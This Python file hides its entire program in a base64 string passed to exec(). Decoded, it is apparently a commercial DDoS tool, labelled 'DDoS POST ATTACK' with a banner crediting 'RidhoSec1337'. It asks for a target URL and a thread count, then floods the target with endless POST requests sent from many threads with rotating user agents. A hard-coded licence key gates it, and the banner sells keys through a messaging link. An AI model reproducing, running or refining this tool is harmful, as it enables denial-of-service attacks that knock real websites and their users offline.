import base64
exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmFuZG9tCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRpbWUKaW1wb3J0IGpzb24KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUKCmRlZiByZWFkX3BheWxvYWQoZmlsZW5hbWUpOgogICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAncicpIGFzIGZpbGU6CiAgICAgICAgcGF5bG9hZCA9IGpzb24ubG9hZChmaWxlKQogICAgcmV0dXJuIHBheWxvYWQKCmRlZiBnZXRfdXNlcl9pcCgpOgogICAgdHJ5OgogICAgICAgICMgTWVuZGFwYXRrYW4gYWxhbWF0IElQIGVrc3Rlcm5hbCBwZW5nZ3VuYSBtZW5nZ3VuYWthbiBsYXlhbmFuIGVrc3Rlcm5hbAogICAgICAgIHVzZXJfaXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpLnRleHQKICAgICAgICByZXR1cm4gdXNlcl9pcAogICAgZXhjZXB0OgogICAgICAgICMgSmlrYSBnYWdhbCBtZW5kYXBhdGthbiBJUCwga2VtYmFsaWthbiBhbGFtYXQgbG9jYWxob3N0CiAgICAgICAgcmV0dXJuICIxMjcuMC4wLjEge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR9KCBUaGlzIGlzIHlvdXIgbG9jbGFob3N0IElQIGJlY2F1c2UgdGhlIHByb2dyYW0gRmFpbGVkIHRvIE9idGFpbiBhbiBJUCBhZGRyZXNzICkiCgpkZWYgYXR0YWNrKHVybCwgdGhyZWFkcywga2V5KToKICAgIGRlZiBzZW5kX3JlcXVlc3RzKCk6CiAgICAgICAgcGFja2V0c19zZW50ID0gMAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiByYW5kb20uY2hvaWNlKHVzZXJfYWdlbnRzKSwKICAgICAgICAgICAgICAgICAgICAiQ29ubmVjdGlvbiI6ICJjbG9zZSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkLCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICB0aW1lc3RhbXAgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJVktJW0tJWQgJUg6JU06JVMiKQogICAgICAgICAgICAgICAgc3RhdHVzX2NvZGVfY29sb3IgPSBGb3JlLkdSRUVOIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMCBlbHNlIEZvcmUuUkVECiAgICAgICAgICAgICAgICBwcmludChmIlvigKJdIHtTdHlsZS5CUklHSFR9e0ZvcmUuR1JFRU59WlNUT1JNIEFTU0FVTFQgQVRUQUNLIFBBQ0tFVHtTdHlsZS5SRVNFVF9BTEx9IFt7dGhyZWFkaW5nLmdldF9pZGVudCgpfV0ge1N0eWxlLkJSSUdIVH1TVEFUVVMgQ09ERSB7c3RhdHVzX2NvZGVfY29sb3J9W3tyZXNwb25zZS5zdGF0dXNfY29kZX1de1N0eWxlLlJFU0VUX0FMTH0ge3RpbWVzdGFtcH0iKQogICAgICAgICAgICAgICAgcGFja2V0c19zZW50ICs9IDEKICAgICAgICAgICAgICAgIHRvdGFsX3BhY2tldHNbMF0gKz0gMQogICAgICAgICAgICAgICAgaWYgdG90YWxfcGFja2V0c1swXSAlIDEwMDAgPT0gMDoKICAgICAgICAgICAgICAgICAgICBwcmludChmIntTdHlsZS5CUklHSFR9e0ZvcmUuWUVMTE9XfVtJTkZPXXtTdHlsZS5SRVNFVF9BTEx9IDEwIFNlY29uZCBQYXVzZSBmb3IgZWZmaWNpZW50IGF0dGFja3MgYW5kIHlvdXIgc3lzdGVtIHBlcmZvcm1hbmNlIikKICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikgICMgTWVuYW1iYWhrYW4gcGVyaW50YWggdW50dWsgbWVtYmVyc2loa2FuIGxheWFyIHRlcm1pbmFsCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxMCkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwoKICAgIHRocmVhZHNfbGlzdCA9IFtdCiAgICBmb3IgaSBpbiByYW5nZSh0aHJlYWRzKToKICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZW5kX3JlcXVlc3RzKQogICAgICAgIHRocmVhZHNfbGlzdC5hcHBlbmQodGhyZWFkKQogICAgICAgIHRocmVhZC5zdGFydCgpCgogICAgcHJpbnQoZiJ7U3R5bGUuQlJJR0hUfUF0dGFjayBzdGFydGVkIHdpdGgge3RocmVhZHN9IHRocmVhZHMuLi57U3R5bGUuUkVTRVRfQUxMfSIpCgogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiQXR0YWNrIHN0b3BwZWQuIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCiAgICB1c2VyX2lwID0gZ2V0X3VzZXJfaXAoKQoKICAgIGJhbm5lciA9IGYiIiIKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilojilojilojilojilojilojilojilZfilpHilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilojilZfilpHilojilojilojilojilojilZfilpHilojilojilojilojilojilojilZfilpHilojilojilojilZfilpHilpHilpHilojilojilojilZcKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilZrilZDilZDilZDilZDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilZrilZDilZDilojilojilZTilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilojilojilZfilpHilojilojilojilojilZEKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilpHilpHilojilojilojilZTilZDilZ3ilZrilojilojilojilojilojilZfilpHilpHilpHilpHilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilojilojilZHilojilojilojilojilojilojilZTilZ3ilojilojilZTilojilojilojilojilZTilojilojilZEKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilojilojilZTilZDilZDilZ3ilpHilpHilpHilZrilZDilZDilZDilojilojilZfilpHilpHilpHilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZHilZrilojilojilZTilZ3ilojilojilZEKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZTilZ3ilpHilpHilpHilojilojilZHilpHilpHilpHilZrilojilojilojilojilojilZTilZ3ilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilZrilZDilZ3ilpHilojilojilZEKICAgICB7U3R5bGUuQlJJR0hUfXtGb3JlLlJFRH3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZ3ilpHilpHilpHilpHilZrilZDilZ3ilpHilpHilpHilpHilZrilZDilZDilZDilZDilZ3ilpHilZrilZDilZ3ilpHilpHilZrilZDilZ3ilZrilZDilZ3ilpHilpHilpHilpHilpHilZrilZDilZ0KCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94paR4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paI4paI4pWX4paR4paR4paR4paR4paR4paI4paI4paI4paI4paI4paI4paI4paI4pWXCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paR4paR4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWdCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94paI4paI4paI4paI4paI4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4pWX4paR4pWa4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paR4paR4paR4paR4paR4paI4paI4pWR4paR4paR4paRCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paR4paR4paR4paR4paR4paI4paI4pWR4paR4paR4paRCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4paR4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWX4paR4paR4paR4paI4paI4pWR4paR4paR4paRCiAgICAge1N0eWxlLkJSSUdIVH17Rm9yZS5SRUR94pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4paR4pWa4pWQ4pWd4paR4paR4paRCgp7U3R5bGUuQlJJR0hUfXtGb3JlLldISVRFfVtcMDMzWzkxbfCflKVcMDMzWzk1bXtTdHlsZS5CUklHSFR9e0ZvcmUuV0hJVEV9XSBERG9TIFBPU1QgQVRUQUNLIEJZIHtTdHlsZS5CUklHSFR9e0ZvcmUuR1JFRU59Li9SaWRob1NlYzEzMzcge1N0eWxlLkJSSUdIVH17Rm9yZS5XSElURX1bXDAzM1s5MW3wn5SlXDAzM1s5NXtTdHlsZS5CUklHSFR9e0ZvcmUuV0hJVEV9XQp7U3R5bGUuQlJJR0hUfXtGb3JlLldISVRFfVvwn5+hXSBTQ1JJUFQgU1RBVFVTIDoge1N0eWxlLkJSSUdIVH17Rm9yZS5ZRUxMT1d9UFJFTUlVTQp7U3R5bGUuQlJJR0hUfXtGb3JlLldISVRFfVt7U3R5bGUuQlJJR0hUfXtGb3JlLkdSRUVOffCfn6J7U3R5bGUuQlJJR0hUfXtGb3JlLldISVRFfV0gWU9VUiBJUDoge0ZvcmUuR1JFRU59e3VzZXJfaXB9CntTdHlsZS5CUklHSFR9e0ZvcmUuV0hJVEV9W3tTdHlsZS5CUklHSFR9e0ZvcmUuWUVMTE9XfT97U3R5bGUuQlJJR0hUfXtGb3JlLldISVRFfV0gTmVlZCBLZXk/IENvbnRhY3QgRGV2ZWxvcGVyOiB7Rm9yZS5HUkVFTn1odHRwczovL3dhLm1lLzYyODgyMjE1NzY2NjIKIiIiCiAgICBwcmludChiYW5uZXIpCgogICAgdXNlcl9hZ2VudHMgPSBbCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OS4wLjQ4NDQuNTEgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk5LjAuNDg0NC41MSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTIuMzsgcnY6OTguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85OC4wIiwKICAgICAgICAiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNV80IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNS40IE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xIiwKICAgICAgICAiTW96aWxsYS81LjAgKEFuZHJvaWQgMTI7IE1vYmlsZTsgcnY6OTguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85OC4wIgogICAgXQoKICAgIHBheWxvYWQgPSByZWFkX3BheWxvYWQoJ3BheWxvYWQuanNvbicpCgogICAgdGFyZ2V0X3VybCA9IGlucHV0KGYie1N0eWxlLkJSSUdIVH1FbnRlciB0YXJnZXQgVVJMOiB7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICBudW1fdGhyZWFkcyA9IGludChpbnB1dChmIntTdHlsZS5CUklHSFR9RW50ZXIgbnVtYmVyIG9mIHRocmVhZHM6IHtTdHlsZS5SRVNFVF9BTEx9IikpCiAgICBrZXkgPSBpbnB1dChmIntTdHlsZS5CUklHSFR9e0ZvcmUuWUVMTE9XfUVudGVyIHRoZSBrZXk6IHtTdHlsZS5SRVNFVF9BTEx9IikKCiAgICBpZiBrZXkgIT0gIkJhYmF5b01lYyI6CiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9SW52YWxpZCBrZXkuIEF0dGFjayBjYW5jZWxsZWQuIikKICAgIGVsc2U6CiAgICAgICAgdG90YWxfcGFja2V0cyA9IFswXSAgIyBWYXJpYWJlbCB1bnR1ayBtZW5naGl0dW5nIHRvdGFsIHBha2V0IHlhbmcgZGlraXJpbQogICAgICAgIGNvbmZpcm1fYXR0YWNrID0gaW5wdXQoZiJ7Rm9yZS5XSElURX1EbyB5b3Ugd2FudCB0byBzdGFydCB0aGUgYXR0YWNrPyBbWS9uXToge1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgIGlmIGNvbmZpcm1fYXR0YWNrLmxvd2VyKCkgPT0gJ3knOgogICAgICAgICAgICBhdHRhY2sodGFyZ2V0X3VybCwgbnVtX3RocmVhZHMsIGtleSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1BdHRhY2sgY2FuY2VsbGVkLiBidXkga2V5IDoge0ZvcmUuR1JFRU59aHR0cHM6Ly93YS5tZS82Mjg4MjIxNTc2NjYyIikK'.encode()).decode())
